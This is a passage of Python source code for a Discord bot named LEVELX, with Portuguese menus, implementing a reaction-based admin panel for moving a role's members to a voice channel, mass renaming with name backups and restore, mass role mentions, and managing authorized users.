        uptime_str = str(uptime).split('.')[0]
        
        uptime_embed = create_embed(
            "TEMPO ONLINE",
            f"⏱️ **Bot Online há:** `{uptime_str}`\n\n"
            f"🕐 **Iniciado em:** `{start_time.strftime('%d/%m/%Y às %H:%M')}`\n"
            f"✅ **Status:** Funcionando perfeitamente!\n\n"
            f"💪 **Estabilidade:** 100%",
            0x2ecc71
        )
        
        await message.edit(embed=uptime_embed)
        await asyncio.sleep(5)
        await show_info_menu(message, session)
    
    elif emoji == "🏠":
        await show_main_menu(message, session)

async def show_main_menu(message, session):
    main_embed = create_embed(
        "PAINEL DE CONTROLE LEVELX",
        "🚀 **Selecione uma categoria abaixo:**\n\n"
        "🎭 **MODERAÇÃO**\n"
        "> • Puxar membros para canal\n"
        "> • Renomear membros em massa\n"
        "> • Marcar cargo\n\n"
        "⚙️ **CONFIGURAÇÕES**\n"
        "> • Gerenciar permissões\n"
        "> • Configurar bot\n\n"
        "📊 **INFORMAÇÕES**\n"
        "> • Status do servidor\n"
        "> • Informações do bot\n\n"
        "**Reaja com os emojis para navegar!**",
        0x3498db
    )
    
    await message.edit(embed=main_embed)
    session["state"] = "main"
    
    await message.clear_reactions()
    emojis = ["🎭", "⚙️", "📊", "❌"]
    for emoji in emojis:
        await message.add_reaction(emoji)

async def show_config_menu(message, session):
    config_embed = create_embed(
        "CONFIGURAÇÕES - LEVELX",
        "⚙️ **Configurações do Sistema:**\n\n"
        "➕ **1 • Adicionar Permissão**\n"
        "> Adicionar usuário autorizado\n\n"
        "➖ **2 • Remover Permissão**\n"
        "> Remover usuário autorizado\n\n"
        "📋 **3 • Listar Autorizados**\n"
        "> Ver usuários com permissão\n\n"
        "🏠 **Voltar ao Menu Principal**",
        0xe67e22
    )
    
    await message.edit(embed=config_embed)
    session["state"] = "configuracoes"
    
    await message.clear_reactions()
    for emoji in ["1️⃣", "2️⃣", "3️⃣", "🏠"]:
        await message.add_reaction(emoji)

async def show_info_menu(message, session):
    info_embed = create_embed(
        "INFORMAÇÕES - LEVELX",
        "📊 **Informações do Sistema:**\n\n"
        "🏢 **1 • Info do Servidor**\n"
        "> Informações detalhadas\n\n"
        "🤖 **2 • Info do Bot**\n"
        "> Status e estatísticas\n\n"
        "⏱️ **3 • Tempo Online**\n"
        "> Uptime do bot\n\n"
        "🏠 **Voltar ao Menu Principal**",
        0x1abc9c
    )
    
    await message.edit(embed=info_embed)
    session["state"] = "informacoes"
    
    await message.clear_reactions()
    for emoji in ["1️⃣", "2️⃣", "3️⃣", "🏠"]:
        await message.add_reaction(emoji)

# Sistema integrado ao on_message principal

async def process_painel_input(msg_id, session, user_input):
    """Processa o input do usuário no painel"""
    painel_message = None
    
    # Encontrar a mensagem do painel
    try:
        painel_message = await session["channel"].fetch_message(msg_id)
    except:
        # Sessão inválida
        if msg_id in painel_sessions:
            del painel_sessions[msg_id]
        return
    
    waiting_for = session.get("waiting_for")
    
    if waiting_for == "puxar_input":
        await handle_puxar_input(painel_message, session, user_input)
    elif waiting_for == "setnick_input":
        await handle_setnick_input(painel_message, session, user_input)
    elif waiting_for == "marcar_input":
        await handle_marcar_input(painel_message, session, user_input)
    elif waiting_for == "addperm_input":
        await handle_addperm_input(painel_message, session, user_input)
    elif waiting_for == "removerperm_input":
        await handle_removerperm_input(painel_message, session, user_input)
    elif waiting_for == "reset_input":
        await handle_reset_input(painel_message, session, user_input)

async def handle_puxar_input(message, session, user_input):
    """Processa input do comando puxar"""
    try:
        role_id = int(user_input.strip())
        role = message.guild.get_role(role_id)
        
        if not role:
            error_embed = create_error_embed(
                "CARGO NÃO ENCONTRADO",
                f"❌ **Cargo com ID `{role_id}` não foi encontrado!**\n\n"
                "Verifique o ID e tente novamente."
            )
            await message.edit(embed=error_embed)
            session.pop("waiting_for", None)
            await asyncio.sleep(5)
            await show_moderacao_menu(message, session)
            return
        
        # Verificar se o usuário está em um canal de voz
        author = message.guild.get_member(session["user_id"])
        if not author or not author.voice or not author.voice.channel:
            error_embed = create_error_embed(
                "CANAL DE VOZ NECESSÁRIO",
                "❌ **Você precisa estar em um canal de voz!**\n\n"
                "Entre em um canal de voz e tente novamente."
            )
            await message.edit(embed=error_embed)
            session.pop("waiting_for", None)
            await asyncio.sleep(5)
            await show_moderacao_menu(message, session)
            return
        
        target_channel = author.voice.channel
        
        # Embed de processamento
        processing_embed = create_embed(
            "PUXANDO MEMBROS",
            f"📞 **Puxando membros do cargo:** `{role.name}`\n"
            f"🎯 **Para o canal:** `{target_channel.name}`\n\n"
            f"⏱️ **Processando {len(role.members)} membros...**",
            0x3498db
        )
        await message.edit(embed=processing_embed)
        
        # Executar o puxar
        moved_count = 0
        failed_count = 0
        
        for member in role.members:
            if member.voice and member.voice.channel and member.voice.channel != target_channel:
                try:
                    await member.move_to(target_channel)
                    moved_count += 1
                    await asyncio.sleep(0.5)
                except:
                    failed_count += 1
        
        # Resultado
        if failed_count == 0:
            result_embed = create_success_embed(
                "MEMBROS PUXADOS COM SUCESSO",
                f"✅ **{moved_count} membros foram movidos!**\n\n"
                f"🎭 **Cargo:** `{role.name}`\n"
                f"🎯 **Canal:** `{target_channel.name}`\n"
                f"📊 **Sucessos:** {moved_count}\n"
                f"❌ **Falhas:** {failed_count}"
            )
        else:
            result_embed = create_embed(
                "PUXAR CONCLUÍDO COM RESSALVAS",
                f"📊 **Resultado do processo:**\n\n"
                f"🎭 **Cargo:** `{role.name}`\n"
                f"🎯 **Canal:** `{target_channel.name}`\n"
                f"✅ **Sucessos:** {moved_count}\n"
                f"❌ **Falhas:** {failed_count}\n\n"
                f"💡 **Algumas falhas podem ser por falta de permissões**",
                0xf39c12
            )
        
        await message.edit(embed=result_embed)
        session.pop("waiting_for", None)
        await asyncio.sleep(8)
        await show_moderacao_menu(message, session)
        
    except ValueError:
        error_embed = create_error_embed(
            "ID INVÁLIDO",
            "❌ **O ID do cargo deve ser um número!**\n\n"
            "Digite apenas números. Exemplo: `123456789`"
        )
        await message.edit(embed=error_embed)
        await asyncio.sleep(3)
        
        # Voltar para o input
        input_embed = create_embed(
            "PUXAR MEMBROS",
            "📞 **Digite o ID do cargo para puxar os membros:**\n\n"
            "💡 **Como usar:**\n"
            "> • Digite apenas o ID do cargo\n"
            "> • Todos os membros do cargo serão puxados\n"
            "> • Você deve estar em um canal de voz\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)

async def handle_setnick_input(message, session, user_input):
    """Processa input do comando setnick"""
    try:
        parts = user_input.strip().split(" ", 1)
        if len(parts) < 2:
            error_embed = create_error_embed(
                "FORMATO INVÁLIDO",
                "❌ **Formato incorreto!**\n\n"
                "**Formato correto:** `ID_CARGO NOVO_NICKNAME`\n"
                "**Exemplo:** `123456789 NovoNome`"
            )
            await message.edit(embed=error_embed)
            await asyncio.sleep(3)
            
            input_embed = create_embed(
                "RENOMEAR EM MASSA",
                "🎨 **Digite: ID_DO_CARGO NOVO_NICKNAME**\n\n"
                "💡 **Exemplo:**\n"
                "> `123456789 NovoNome`\n\n"
                "⚠️ **Aviso:**\n"
                "> Todos os membros do cargo serão renomeados!\n\n"
                "⏱️ **Aguardando sua resposta...**",
                0x3498db
            )
            await message.edit(embed=input_embed)
            return
        
        role_id = int(parts[0])
        nickname = parts[1]
        
        role = message.guild.get_role(role_id)
        if not role:
            error_embed = create_error_embed(
                "CARGO NÃO ENCONTRADO",
                f"❌ **Cargo com ID `{role_id}` não foi encontrado!**"
            )
            await message.edit(embed=error_embed)
            session.pop("waiting_for", None)
            await asyncio.sleep(5)
            await show_moderacao_menu(message, session)
            return
        
        if not role.members:
            error_embed = create_embed(
                "CARGO VAZIO",
                f"⚠️ **O cargo `{role.name}` não possui membros!**"
            )
            await message.edit(embed=error_embed)
            session.pop("waiting_for", None)
            await asyncio.sleep(5)
            await show_moderacao_menu(message, session)
            return
        
        # Criar backup dos nomes originais
        backup_key = f"{message.guild.id}_{role_id}"
        original_names = {}
        
        for member in role.members:
            original_names[str(member.id)] = member.display_name
        
        # Salvar backup no config
        config["setnick_backups"][backup_key] = {
            "guild_name": message.guild.name,
            "role_name": role.name,
            "role_id": role_id,
            "timestamp": datetime.datetime.now().isoformat(),
            "original_names": original_names
        }
        save_config(config)
        
        # Processar renomeação
        processing_embed = create_embed(
            "RENOMEANDO MEMBROS",
            f"🎨 **Renomeando membros do cargo:** `{role.name}`\n"
            f"🏷️ **Novo nickname:** `{nickname}`\n"
            f"💾 **Backup criado:** Nomes salvos automaticamente\n\n"
            f"⏱️ **Processando {len(role.members)} membros...**"
        )
        await message.edit(embed=processing_embed)
        
        success_count = 0
        failed_count = 0
        
        for member in role.members:
            try:
                await member.edit(nick=nickname)
                success_count += 1
                await asyncio.sleep(0.5)
            except:
                failed_count += 1
        
        # Resultado
        if failed_count == 0:
            result_embed = create_success_embed(
                "RENOMEAÇÃO CONCLUÍDA",
                f"✅ **Todos os membros foram renomeados!**\n\n"
                f"🎭 **Cargo:** `{role.name}`\n"
                f"🏷️ **Novo nickname:** `{nickname}`\n"
                f"📊 **Total:** {success_count} membros\n"
                f"💾 **Backup:** Nomes originais salvos\n\n"
                f"🔄 **Reaja com 🔄 para resetar os nomes originais**"
            )
        else:
            result_embed = create_embed(
                "RENOMEAÇÃO CONCLUÍDA COM RESSALVAS",
                f"📊 **Resultado:**\n\n"
                f"🎭 **Cargo:** `{role.name}`\n"
                f"🏷️ **Novo nickname:** `{nickname}`\n"
                f"✅ **Sucessos:** {success_count}\n"
                f"❌ **Falhas:** {failed_count}\n"
                f"💾 **Backup:** Nomes originais salvos\n\n"
                f"🔄 **Reaja com 🔄 para resetar os nomes originais**",
                0xf39c12
            )
        
        await message.edit(embed=result_embed)
        
        # Adicionar reação de reset
        await message.add_reaction("🔄")
        await message.add_reaction("🏠")
        
        # Salvar informações para reset
        session.pop("waiting_for", None)
        session["setnick_result"] = {
            "backup_key": backup_key,
            "role_id": role_id,
            "success_count": success_count,
            "failed_count": failed_count
        }
        
        # Não volta automaticamente, espera ação do usuário
        
    except ValueError:
        error_embed = create_error_embed(
            "ID INVÁLIDO",
            "❌ **O ID do cargo deve ser um número!**"
        )
        await message.edit(embed=error_embed)
        await asyncio.sleep(3)
        
        input_embed = create_embed(
            "RENOMEAR EM MASSA",
            "🎨 **Digite: ID_DO_CARGO NOVO_NICKNAME**\n\n"
            "💡 **Exemplo:**\n"
            "> `123456789 NovoNome`\n\n"
            "⚠️ **Aviso:**\n"
            "> Todos os membros do cargo serão renomeados!\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)

async def handle_marcar_input(message, session, user_input):
    """Processa input do comando marcar"""
    try:
        role_id = int(user_input.strip())
        role = message.guild.get_role(role_id)
        
        if not role:
            error_embed = create_error_embed(
                "CARGO NÃO ENCONTRADO",
                f"❌ **Cargo com ID `{role_id}` não foi encontrado!**"
            )
            await message.edit(embed=error_embed)
            session.pop("waiting_for", None)
            await asyncio.sleep(5)
            await show_moderacao_menu(message, session)
            return
        
        if not role.members:
            error_embed = create_embed(
                "CARGO VAZIO",
                f"⚠️ **O cargo `{role.name}` não possui membros!**"
            )
            await message.edit(embed=error_embed)
            session.pop("waiting_for", None)
            await asyncio.sleep(5)
            await show_moderacao_menu(message, session)
            return
        
        # Processar menções
        processing_embed = create_embed(
            "MARCANDO CARGO",
            f"📢 **Marcando membros do cargo:** `{role.name}`\n"
            f"👥 **Total de membros:** {len(role.members)}\n\n"
            f"⏱️ **Enviando menções...**"
        )
        await message.edit(embed=processing_embed)
        
        # Criar lista de menções
        mentions = [member.mention for member in role.members]
        chunk_size = 50
        member_chunks = [mentions[i:i + chunk_size] for i in range(0, len(mentions), chunk_size)]
        
        for chunk_index, chunk in enumerate(member_chunks):
            mentions_text = " ".join(chunk)
            
            header_embed = create_embed(
                f"MARCANDO CARGO - {role.name}",
                f"📢 **Parte {chunk_index + 1}/{len(member_chunks)}**\n\n"
                f"{mentions_text}",
                0x3498db
            )
            
            await session["channel"].send(embed=header_embed)
            
            if len(member_chunks) > 1:
                await asyncio.sleep(1)
        
        # Resultado final
        result_embed = create_success_embed(
            "CARGO MARCADO",
            f"✅ **{len(role.members)} membros do cargo `{role.name}` foram mencionados!**\n\n"
            f"📊 **Mensagens enviadas:** {len(member_chunks)}"
        )
        
        await message.edit(embed=result_embed)
        session.pop("waiting_for", None)
        await asyncio.sleep(5)
        await show_moderacao_menu(message, session)
        
    except ValueError:
        error_embed = create_error_embed(
            "ID INVÁLIDO",
            "❌ **O ID do cargo deve ser um número!**"
        )
        await message.edit(embed=error_embed)
        await asyncio.sleep(3)
        
        input_embed = create_embed(
            "MARCAR CARGO",
            "📢 **Digite o ID do cargo para mencionar:**\n\n"
            "💡 **Como usar:**\n"
            "> • Digite apenas o ID do cargo\n"
            "> • Todos os membros serão mencionados\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)

async def handle_addperm_input(message, session, user_input):
    """Processa input do addperm"""
    try:
        user_id = int(user_input.strip())
        
        if user_id in config["authorized-users"]:
            info_embed = create_embed(
                "USUÁRIO JÁ AUTORIZADO",
                f"ℹ️ **O usuário `{user_id}` já possui permissões!**",
                0xf39c12
            )
            await message.edit(embed=info_embed)
            await asyncio.sleep(3)
            await show_config_menu(message, session)
            return
        
        config["authorized-users"].append(user_id)
        save_config(config)
        reload_config()
        
        success_embed = create_success_embed(
            "PERMISSÃO ADICIONADA",
            f"✅ **Permissão adicionada para o usuário:** `{user_id}`\n\n"
            f"🎉 **O usuário agora pode usar o bot!**"
        )
        
        await message.edit(embed=success_embed)
        session.pop("waiting_for", None)
        await asyncio.sleep(5)
        await show_config_menu(message, session)
        
    except ValueError:
        error_embed = create_error_embed(
            "ID INVÁLIDO",
            "❌ **O ID do usuário deve ser um número!**"
        )
        await message.edit(embed=error_embed)
        await asyncio.sleep(3)
        
        input_embed = create_embed(
            "ADICIONAR PERMISSÃO",
            "➕ **Digite o ID do usuário:**\n\n"
            "💡 **Como obter o ID:**\n"
            "> • Ativar modo desenvolvedor\n"
            "> • Clicar com botão direito no usuário\n"
            "> • Copiar ID\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)

async def handle_removerperm_input(message, session, user_input):
    """Processa input do removerperm"""
    try:
        user_id = int(user_input.strip())
        
        if user_id not in config["authorized-users"]:
            info_embed = create_embed(
                "USUÁRIO NÃO AUTORIZADO",
                f"ℹ️ **O usuário `{user_id}` não possui permissões!**",
                0xf39c12
            )
            await message.edit(embed=info_embed)
            await asyncio.sleep(3)
            await show_config_menu(message, session)
            return
        
        config["authorized-users"].remove(user_id)
        save_config(config)
        reload_config()
        
        success_embed = create_success_embed(
            "PERMISSÃO REMOVIDA",
            f"✅ **Permissão removida do usuário:** `{user_id}`\n\n"
            f"⚠️ **O usuário não pode mais usar o bot.**"
        )
        
        await message.edit(embed=success_embed)
        session.pop("waiting_for", None)
        await asyncio.sleep(5)
        await show_config_menu(message, session)
        
    except ValueError:
        error_embed = create_error_embed(
            "ID INVÁLIDO",
            "❌ **O ID do usuário deve ser um número!**"
        )
        await message.edit(embed=error_embed)
        await asyncio.sleep(3)
        
        input_embed = create_embed(
            "REMOVER PERMISSÃO",
            "➖ **Digite o ID do usuário:**\n\n"
            "⚠️ **Cuidado:**\n"
            "> • O usuário perderá acesso ao bot\n"
            "> • Certifique-se do ID correto\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)

async def handle_reset_input(message, session, user_input):
    """Processa input do reset de nomes"""
    try:
        backup_index = int(user_input.strip()) - 1  # Converter para index (base 0)
        backup_keys = session.get("backup_list", [])
        
        if backup_index < 0 or backup_index >= len(backup_keys):
            error_embed = create_error_embed(
                "NÚMERO INVÁLIDO",
                f"❌ **Número deve estar entre 1 e {len(backup_keys)}!**"
            )
            await message.edit(embed=error_embed)
            await asyncio.sleep(3)
            
            # Voltar para a lista de backups
            await handle_moderacao_menu(message, "4️⃣", session)
            return
        
        backup_key = backup_keys[backup_index]
        backup_data = config["setnick_backups"][backup_key]
        
        # Extrair guild_id e role_id do backup_key
        guild_id_str, role_id_str = backup_key.split("_", 1)
        role_id = int(role_id_str)
        
        role = message.guild.get_role(role_id)
        if not role:
            error_embed = create_error_embed(
                "CARGO NÃO ENCONTRADO",
                f"❌ **O cargo não foi encontrado no servidor!**\n\n"
                "O cargo pode ter sido deletado."
            )
            await message.edit(embed=error_embed)
            session.pop("waiting_for", None)
            await asyncio.sleep(5)
            await show_moderacao_menu(message, session)
            return
        
        # Processar reset
        processing_embed = create_embed(
            "RESTAURANDO NOMES",
            f"🔄 **Restaurando nomes do cargo:** `{role.name}`\n"
            f"💾 **Backup de:** `{backup_data['timestamp'].split('T')[0]}`\n\n"
            f"⏱️ **Processando {len(backup_data['original_names'])} membros...**"
        )
        await message.edit(embed=processing_embed)
        
        success_count = 0
        failed_count = 0
        not_found_count = 0
        
        for member_id_str, original_name in backup_data["original_names"].items():
            try:
                member_id = int(member_id_str)
                member = message.guild.get_member(member_id)
                
                if not member:
                    not_found_count += 1
                    continue
                
                # Se o nome original era o nome de usuário (sem nickname), passar None
                if original_name == member.name:
                    await member.edit(nick=None)
                else:
                    await member.edit(nick=original_name)
                
                success_count += 1
                await asyncio.sleep(0.5)
            except:
                failed_count += 1
        
        # Resultado
        if failed_count == 0 and not_found_count == 0:
            result_embed = create_success_embed(
                "NOMES RESTAURADOS COM SUCESSO",
                f"✅ **Todos os nomes foram restaurados!**\n\n"
                f"🎭 **Cargo:** `{role.name}`\n"
                f"📊 **Restaurados:** {success_count} membros\n"
                f"💾 **Backup removido automaticamente**"
            )
        else:
            result_embed = create_embed(
                "RESET CONCLUÍDO COM RESSALVAS",
                f"📊 **Resultado:**\n\n"
                f"🎭 **Cargo:** `{role.name}`\n"
                f"✅ **Sucessos:** {success_count}\n"
                f"❌ **Falhas:** {failed_count}\n"
                f"👻 **Não encontrados:** {not_found_count}\n"
                f"💾 **Backup removido automaticamente**",
                0xf39c12
            )
        
        # Remover backup após uso
        del config["setnick_backups"][backup_key]
        save_config(config)
        
        await message.edit(embed=result_embed)
        session.pop("waiting_for", None)
        session.pop("backup_list", None)
        await asyncio.sleep(8)
        await show_moderacao_menu(message, session)
        
    except ValueError:
        error_embed = create_error_embed(
            "FORMATO INVÁLIDO",
            "❌ **Digite apenas o número do backup!**\n\n"
            "💡 **Exemplo:** `1` para o primeiro backup"
        )
        await message.edit(embed=error_embed)
        await asyncio.sleep(3)
        
        # Voltar para a lista de backups
        await handle_moderacao_menu(message, "4️⃣", session)

async def handle_setnick_reset(message, session):
    """Processa reset direto após setnick usando a reação 🔄"""
    setnick_data = session.get("setnick_result", {})
    backup_key = setnick_data.get("backup_key")
    
    if not backup_key or backup_key not in config["setnick_backups"]:
        error_embed = create_error_embed(
            "BACKUP NÃO ENCONTRADO",
            "❌ **Backup não está mais disponível!**\n\n"
            "O backup pode ter sido removido ou corrompido."
        )
        await message.edit(embed=error_embed)
        await asyncio.sleep(5)
        await show_moderacao_menu(message, session)
        return
    
    backup_data = config["setnick_backups"][backup_key]
    
    # Extrair role_id do backup_key
    guild_id_str, role_id_str = backup_key.split("_", 1)
    role_id = int(role_id_str)
    
    role = message.guild.get_role(role_id)
    if not role:
        error_embed = create_error_embed(
            "CARGO NÃO ENCONTRADO",
            "❌ **O cargo não foi encontrado!**\n\n"
            "O cargo pode ter sido deletado."
        )
        await message.edit(embed=error_embed)
        session.pop("setnick_result", None)
        await asyncio.sleep(5)
        await show_moderacao_menu(message, session)
        return
    
    # Processar reset automático
    processing_embed = create_embed(
        "RESTAURANDO NOMES ORIGINAIS",
        f"🔄 **Restaurando nomes do cargo:** `{role.name}`\n"
        f"💾 **Backup automático sendo aplicado...**\n\n"
        f"⏱️ **Processando {len(backup_data['original_names'])} membros...**"
    )
    await message.edit(embed=processing_embed)
    await message.clear_reactions()
    
    success_count = 0
    failed_count = 0
    not_found_count = 0
    
    for member_id_str, original_name in backup_data["original_names"].items():
        try:
            member_id = int(member_id_str)
            member = message.guild.get_member(member_id)
            
            if not member:
                not_found_count += 1
                continue
            
            # Se o nome original era o nome de usuário (sem nickname), passar None
            if original_name == member.name:
                await member.edit(nick=None)
            else:
                await member.edit(nick=original_name)
            
            success_count += 1
            await asyncio.sleep(0.5)
        except:
            failed_count += 1
    
    # Resultado
    if failed_count == 0 and not_found_count == 0:
        result_embed = create_success_embed(
            "RESET CONCLUÍDO COM SUCESSO",
            f"✅ **Todos os nomes foram restaurados!**\n\n"
            f"🎭 **Cargo:** `{role.name}`\n"
            f"📊 **Restaurados:** {success_count} membros\n\n"
            f"🎉 **Os membros voltaram aos nomes originais!**"
        )
    else:
        result_embed = create_embed(
            "RESET CONCLUÍDO COM RESSALVAS",
            f"📊 **Resultado do Reset:**\n\n"
            f"🎭 **Cargo:** `{role.name}`\n"
            f"✅ **Sucessos:** {success_count}\n"
            f"❌ **Falhas:** {failed_count}\n"
            f"👻 **Não encontrados:** {not_found_count}",
            0xf39c12
        )
    
    # Remover backup e dados da sessão
    del config["setnick_backups"][backup_key]
    save_config(config)
    session.pop("setnick_result", None)
    
    await message.edit(embed=result_embed)
    await asyncio.sleep(8)
    await show_moderacao_menu(message, session)

async def show_moderacao_menu(message, session):
    """Mostra o menu de moderação"""
    mod_embed = create_embed(
        "MODERAÇÃO - LEVELX",
        "🎭 **Ferramentas de Moderação:**\n\n"
        "📞 **1 • Puxar Membros**\n"
        "> Mover membros para seu canal\n\n"
        "🎨 **2 • Renomear Massa**\n"
        "> Renomear todos de um cargo\n\n"
        "📢 **3 • Marcar Cargo**\n"
        "> Mencionar todos de um cargo\n\n"
        "🔄 **4 • Reset Nomes**\n"
        "> Restaurar nomes originais dos cargos\n\n"
        "🏠 **Voltar ao Menu Principal**",
        0x9b59b6
    )
    
    await message.edit(embed=mod_embed)
    session["state"] = "moderacao"
    
    await message.clear_reactions()
    for emoji in ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "🏠"]:
        await message.add_reaction(emoji)

bot.run(token)